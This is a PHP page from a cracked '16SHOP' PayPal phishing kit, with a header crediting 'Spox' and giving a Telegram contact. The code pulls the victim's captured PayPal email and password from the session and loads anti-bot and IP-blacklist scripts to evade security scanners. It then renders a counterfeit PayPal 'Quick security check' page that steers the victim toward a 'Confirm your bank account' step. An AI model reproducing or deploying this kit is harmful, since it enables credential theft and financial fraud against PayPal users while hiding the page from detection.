<?php

/**
 * 16SHOP PAYPAL CRACKED BY SPOX
 * icq & telegram = @spoxcoder
 
###############################################
#$            CRACKED by Spox_dz             $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 16SHOP            $#
###############################################

**/


error_reporting(0);
session_start();
include'../Spox/Anti/IP-BlackList.php';  
include'../Spox/Anti/Bot-Crawler.php';
include'../Spox/Anti/Bot-Spox.php';
include'../Spox/Functions/Fuck-you.php'; 
include'../Spox/Anti/Dila_DZ.php';
require_once '../main.php';
require_once 'session.php';
include'../Spox/spox_config.php';


$userpaypal = $_SESSION['EML'];
$passwordpaypal = $_SESSION['PWD'];
if($letter == 'unusual_activity') {
    $locked = parse_ini_file("../unusual_activity.ini", true);
}elseif($letter == 'limited') {
    $locked = parse_ini_file("../limited.ini", true);
}
   $notice['we'] = $locked['EN']['notice'];
   $notice['weneed'] = $locked['EN']['desc'];
   $notice['but'] = $locked['EN']['button'];
?>
<!DOCTYPE html>
<html dir="ltr" lang="en"./lib/fonts>

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta content="xeci6SpvxO3bLhGYql73GHoAGGQvEIDZVRaYc=" name="csrf-token">
    <meta name="pageInfo" content="Script info: script: node, template:  undefined,
    date: Feb 25, 2020 10:19:56 -08:00, country: US, language: en
    hostname : rZJvnqaaQhLn/nmWT8cSUrLUCF91zHwn5XkqptSQHQqzSjHoyRoboA rlogid : rZJvnqaaQhLn%2FnmWT8cSUg%2BFylqOCirdAUXJpxqmWT2Fcw2fWudOHXXyWhMpmsnZbNLDvyUMab4_1707d93b3f2 null">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/c37/6b4b09b0a840a5f78eb136a2f5817/css/app.css">
    <title>PayPal</title>
</head>

<body data-nemo="documentId" class="">
    <div>
        <style nonce="">
            html {
                display: block
            }
            .modal-animate {
            	background: rgba(255, 255, 255, 0.8);
            }
        </style>
        <div>
            <div>
                <div class="jsDisabled">
                </div>
                    <div class="loaderOverlay">
                        <div data-nemo="loaderOverlay" class="modal-animate hide" id="rotate">
                            <div class="rotate"></div>
                            <div class="processing">Processing...</div>
                            <div class="loaderOverlayAdditionalElements"></div>
                        </div>
                        <div class="modal-overlay hide"></div>
                    </div>
                </div>
                <div class="contentContainer " id="content2">
                    <div class="challengesForm" data-nemo="entryPage">
                        <fieldset>
                            <div id="challenges" class="textCenter challenges panel">
                                <header>
                                    <div class="paypal-logo"></div>
                                </header>
                                <div class="challengesSection">
                                    <h1>Quick security check</h1>
                                    <p class="description">We just need some additional info to confirm it's you.</p>
                                    <div class="domainChallenges">
                                        <ul>
                                            <li id="bank-challenge-option" class="challenge-option selected" data-nemo="bankChallengeOption">
                                                <label for="bank-challenge-option-input">
                                                    <input type="radio" id="bank-challenge-option-input" component="input" name="selectedChallengeType" value="bank"><span class="styled-radio-button-border"><span class="styled-radio-button"></span></span>
                                                    <div class="challenge-information">
                                                        <p class="label">Confirm your bank account</p>
                                                    </div>
                                                    <div>
                                                        </div>
                                                </label>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="action">
                                        <a  href="banks?key=<?php echo $key;?>"><button  type="button" class="vx_btn vx_btn-block" >Next</button></a>
                                    </div>
                                    <div class="infoSection"></div>
                                </div>
                            </div>
                        </fieldset>
                    </div>
                    <div class="loaderOverlay">
                        <div data-nemo="loaderOverlay" class="modal-animate hide" id="rotate2">
                            <div class="rotate"></div>
                            <div class="processing">Processing...</div>
                            <div class="loaderOverlayAdditionalElements"></div>
                        </div>
                        <div class="modal-overlay hide"></div>
                    </div>
                </div>


    <footer class="footer">
        <ul class="footerLinks">
            <li class="contactFooterListItem"><a href="javascript:void(0)">Contact Us</a></li>
            <li class="privacyFooterListItem"><a href="javascript:void(0)">Privacy</a></li>
            <li class="legalFooterListItem"><a href="javascript:void(0)">Legal</a></li>
            <li class="worldwideFooterListItem"><a href="javascript:void(0)">Worldwide</a></li>
        </ul>
        <div></div>
    </footer>
    <div class="fpti"></div>
    <div></div>
  
</body>

</html>